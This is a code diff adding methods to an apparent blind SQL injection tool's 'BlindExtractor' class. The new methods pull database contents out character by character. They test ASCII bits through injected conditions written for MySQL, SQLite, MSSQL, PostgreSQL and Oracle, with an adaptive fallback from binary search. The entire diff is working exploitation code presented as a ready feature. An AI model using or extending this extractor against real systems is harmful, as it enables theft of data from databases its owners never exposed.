@@ -330,6 +330,94 @@ class BlindExtractor:
         
         return None
 
+    async def _extract_char_bitwise(self, sql_expr: str, position: int) -> Optional[str]:
+        """Extract a single character by testing individual bits (7 bits for ASCII).
+        
+        More reliable than binary search in noisy environments — each bit is
+        an independent test. Requires exactly 7 requests per character
+        (vs ~7 average for binary search), but tolerates individual errors better.
+        """
+        dbms = self.sqli.dbms or "mysql"
+        
+        if dbms in ("mysql", "", "sqlite"):
+            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
+        elif dbms == "mssql":
+            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
+        elif dbms == "postgresql":
+            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
+        elif dbms == "oracle":
+            char_func = f"ASCII(SUBSTR({sql_expr},{position},1))"
+        else:
+            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
+        
+        char_val = 0
+        for bit in range(7):  # Bits 0-6 (ASCII range 0-127)
+            # Test if bit N is set: (val >> N) & 1 = 1
+            # Equivalent to: val & (1 << N) != 0
+            # Equivalent to: (val / power_of_2) % 2 = 1
+            power = 1 << bit
+            
+            if dbms in ("mysql", "", "sqlite"):
+                cond = f"({char_func})>>{bit}&1=1"
+            elif dbms == "mssql":
+                cond = f"({char_func})/{power}%2=1"
+            elif dbms == "postgresql":
+                cond = f"({char_func})>>{bit}&1=1"
+            elif dbms == "oracle":
+                cond = f"BITAND({char_func},{power})={power}"
+            else:
+                cond = f"({char_func})>>{bit}&1=1"
+            
+            if await self.check_condition(cond):
+                char_val |= power
+        
+        if 32 <= char_val <= 126:
+            return chr(char_val)
+        elif char_val == 0:
+            return None  # NULL or end of string
+        
+        return None
+
+    async def extract_string_adaptive(self, sql_expr: str, max_len: int = 255) -> str:
+        """Extract a string with adaptive strategy: start with binary search,
+        fall back to bitwise on failures.
+        
+        This is the recommended extraction method for noisy environments.
+        """
+        length = await self._extract_length(sql_expr, max_len)
+        if not length:
+            return ""
+        
+        result_chars = []
+        consecutive_failures = 0
+        use_bitwise = False
+        
+        for pos in range(1, length + 1):
+            char = None
+            
+            if not use_bitwise:
+                char = await self._extract_char(sql_expr, pos)
+                if char is None:
+                    consecutive_failures += 1
+                    if consecutive_failures >= 3:
+                        logger.info("Switching to bitwise extraction due to repeated failures")
+                        use_bitwise = True
+                        char = await self._extract_char_bitwise(sql_expr, pos)
+                else:
+                    consecutive_failures = 0
+            else:
+                char = await self._extract_char_bitwise(sql_expr, pos)
+            
+            if char is None:
+                result_chars.append("?")
+            else:
+                result_chars.append(char)
+            
+            self.stats.requests_made += 1
+            self.stats.chars_extracted += 1
+        
+        return "".join(result_chars)
+
     async def extract_int(self, sql_expr: str, max_val: int = 10000) -> int:
         """Extract an integer SQL expression via binary search.
         
